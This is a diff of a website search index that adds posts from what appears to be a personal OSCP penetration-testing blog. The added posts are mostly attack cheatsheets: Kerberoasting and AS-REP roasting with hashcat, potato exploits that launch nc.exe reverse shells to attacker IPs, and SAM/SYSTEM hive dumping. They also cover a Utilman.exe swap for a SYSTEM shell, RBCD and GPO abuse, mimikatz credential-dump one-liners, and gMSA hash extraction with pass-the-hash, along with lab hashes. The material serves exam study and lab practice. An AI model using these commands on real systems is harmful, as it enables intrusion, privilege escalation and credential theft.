@@ -1,5 +1,37 @@
 var relearn_searchindex = [
   {
+    "breadcrumb": "Zenu \u003e Posts",
+    "content": "Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:\nhashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule\nAS-REP Roasting (user account) windows .\\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:\nhashcat -m 18200 hash.txt /path/to/wordlist\nWindows privileges SeImpersonatePrivilege potato .\\SigmaPotato.exe --revshell 192.168.45.188 4444 .\\godpotato.exe -cmd \"nc.exe 192.168.45.246 443 -e cmd\" .\\JuicyPotatoNG.exe -t * -p \"c:\\windows\\system32\\cmd.exe\" -a \"/c C:\\users\\chen\\nc.exe 192.168.45.226 443 -e cmd\" SeBackupPrivilege copy SAM and SYSTEM files *Evil-WinRM* PS C:\\users\\anirudh\u003e reg save hklm\\sam ./sam The operation completed successfully. *Evil-WinRM* PS C:\\users\\anirudh\u003e reg save hklm\\system ./system The operation completed successfully. download to kali machine *Evil-WinRM* PS C:\\users\\anirudh\u003e download sam Info: Downloading C:\\users\\anirudh\\sam to sam Info: Download successful! *Evil-WinRM* PS C:\\users\\anirudh\u003e download system Info: Downloading C:\\users\\anirudh\\system to system Info: Download successful! extract credentials impacket-secretsdump -system system -sam sam local SeRestorePrivilege https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe rdesktop 192.168.134.165 SeManageVolumePrivilege Execute the tool\nGPO ReadGMSAPassword target: svc_apache gmsapasswordreader.exe --accountname svc_apache GenericAll on Computer add a fake computer impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 [*] Successfully added machine account fake$ with password password! Delegate role impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] fake$ (S-1-5-21-537427935-490066102-1511301751-4101) WriteOwner make the user (anirudh) owner of the policy. impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' give all privileges to the user impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172 Add the user to local admin using SharpGPOAbuse.exe .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" Update the policy gpupdate /force mimikatz sekurlsa::logonpasswords sekurlsa::wdigest lsadump::sam lsadump::lsa lsadump::cache lsadump::secrets one liner .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::lsa\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::cache\" \"exit\" .\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::wdigest\" \"exit\"",
+    "description": "Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:\nhashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule\nAS-REP Roasting (user account) windows .\\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:",
+    "tags": [],
+    "title": "OSCP_cheatsheet",
+    "uri": "/posts/oscp_cheatsheet/index.html"
+  },
+  {
+    "breadcrumb": "",
+    "content": "",
+    "description": "",
+    "tags": [],
+    "title": "Zenu",
+    "uri": "/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Posts \u003e Active Directory",
+    "content": "SeRestorePrivilege When an account has SeRestorePrivilege, it can be leveraged to achieve privilege escalation by overwriting protected system files.\nObtain the required script Download the following script, which enables the privilege in the current session:\nscript file.\nEnable the privilege and replace Utilman Execute the script and abuse the privilege to replace Utilman.exe with cmd.exe:\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe This works because SeRestorePrivilege allows bypassing file permissions when writing to system locations.\nConnect via RDP From a Linux machine, connect to the target using RDP:\nrdesktop \u003ctarget IP\u003e Trigger SYSTEM shell On the login screen, click the Ease of Access button. Since Utilman.exe has been replaced, this will launch cmd.exe with SYSTEM privileges.",
+    "description": "SeRestorePrivilege When an account has SeRestorePrivilege, it can be leveraged to achieve privilege escalation by overwriting protected system files.\nObtain the required script Download the following script, which enables the privilege in the current session:\nscript file.\nEnable the privilege and replace Utilman Execute the script and abuse the privilege to replace Utilman.exe with cmd.exe:\n.\\EnableSeRestorePrivilege.ps1 ren C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman.pwned ren C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe This works because SeRestorePrivilege allows bypassing file permissions when writing to system locations.",
+    "tags": [],
+    "title": "Serestoreprivilege",
+    "uri": "/posts/ad/serestoreprivilege/index.html"
+  },
+  {
+    "breadcrumb": "Zenu \u003e Posts \u003e Active Directory",
+    "content": "GMSAPassword When a user has adGMSAPassword permission over a target account, it is possible to retrieve the managed password and derive usable credentials for authentication.\nAbuse workflow Identify GMSA permissions If your account has adGMSAPassword rights over a Group Managed Service Account (gMSA), you can extract its password material.\nPrepare the extraction tool Use a tool such as gmsapasswordreader.exe to retrieve the password data.\nTransfer the binary to the target machine (in this case, enox) and execute it:\ngmsapasswordreader.exe --accountname svc_apache Calculating hashes for Old Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : B4A3125F0CB30FCBB499D4B4EB1C20D2 [*] aes128_cts_hmac_sha1 : 51943C933F7A24126B1C43883866DDB4 [*] aes256_cts_hmac_sha1 : 003367B7C9B89B1717838E9CE2B79C0CD458326E32870F73EC94AF810F4A7E32 [*] des_cbc_md5 : 45C4D9732C9D1FD5 Calculating hashes for Current Value [*] Input username : svc_apache$ [*] Input domain : HEIST.OFFSEC [*] Salt : HEIST.OFFSECsvc_apache$ [*] rc4_hmac : 037AE0A6176EB04FD4C7AECEB0C4327E [*] aes128_cts_hmac_sha1 : 4CBAA41110A1C11A787B3B007511BE64 [*] aes256_cts_hmac_sha1 : 337BDE8B0B552127E854D423A2B5293DC6091F71C5D76E373341959882AFFFE8 [*] des_cbc_md5 : 7964FE5D51E5869D Authenticate using the retrieved hash With the extracted NTLM (RC4) hash, authenticate as the gMSA account:\nevil-winrm -i 192.168.134.165 -u svc_apache$ -H 037AE0A6176EB04FD4C7AECEB0C4327E",
+    "description": "GMSAPassword When a user has adGMSAPassword permission over a target account, it is possible to retrieve the managed password and derive usable credentials for authentication.\nAbuse workflow Identify GMSA permissions If your account has adGMSAPassword rights over a Group Managed Service Account (gMSA), you can extract its password material.",
+    "tags": [],
+    "title": "AD Gmsapassword",
+    "uri": "/posts/ad/gmsapassword/index.html"
+  },
+  {
     "breadcrumb": "Zenu \u003e Tags",
     "content": "",
     "description": "",
@@ -35,17 +67,9 @@ var relearn_searchindex = [
     "uri": "/tags/index.html"
   },
   {
-    "breadcrumb": "",
-    "content": "",
-    "description": "",
-    "tags": [],
-    "title": "Zenu",
-    "uri": "/index.html"
-  },
-  {
     "breadcrumb": "Zenu \u003e Posts",
-    "content": "Active Directory cheatsheet\nGenericAll permission on a domain computer",
-    "description": "Active Directory cheatsheet\nGenericAll permission on a domain computer",
+    "content": "Active Directory cheatsheet\nAD Gmsapassword GenericAll permission on a domain computer Serestoreprivilege",
+    "description": "Active Directory cheatsheet\nAD Gmsapassword GenericAll permission on a domain computer Serestoreprivilege",
     "tags": [],
     "title": "Active Directory",
     "uri": "/posts/ad/index.html"
@@ -171,7 +195,7 @@ var relearn_searchindex = [
     "content": "",
     "description": "",
     "tags": [],
-    "title": "Tag :: Bloodhound",
+    "title": "Tag :: BloodHound",
     "uri": "/tags/bloodhound/index.html"
   },
   {
@@ -188,7 +212,7 @@ var relearn_searchindex = [
     "description": "Heist writeup - Active Directory penetration testing walkthrough covering NTLM capture, gMSA password extraction, lateral movement with BloodHound, and privilege escalation using SeRestorePrivilege.",
     "tags": [
       "SeRestorePrivilege",
-      "Bloodhound",
+      "BloodHound",
       "ReadGMSAPassword",
       "Responder",
       "GMSApassword",
@@ -276,7 +300,7 @@ var relearn_searchindex = [
     "tags": [
       "Responder",
       "DACL",
-      "Bloodhound",
+      "BloodHound",
       "Ntlm_theft",
       "SharpGPOAbuse",
       "Impacket-Owneredit",
@@ -323,8 +347,8 @@ var relearn_searchindex = [
   },
   {
     "breadcrumb": "Zenu",
-    "content": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
-    "description": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
+    "content": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer OSCP_cheatsheet Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
+    "description": "Cheat Sheets \u0026 Tips\nActive Directory File Transfer OSCP_cheatsheet Pivoting Stabilize a reverse shell WebDAV Exploitation with davtest",
     "tags": [],
     "title": "Posts",
     "uri": "/posts/index.html"
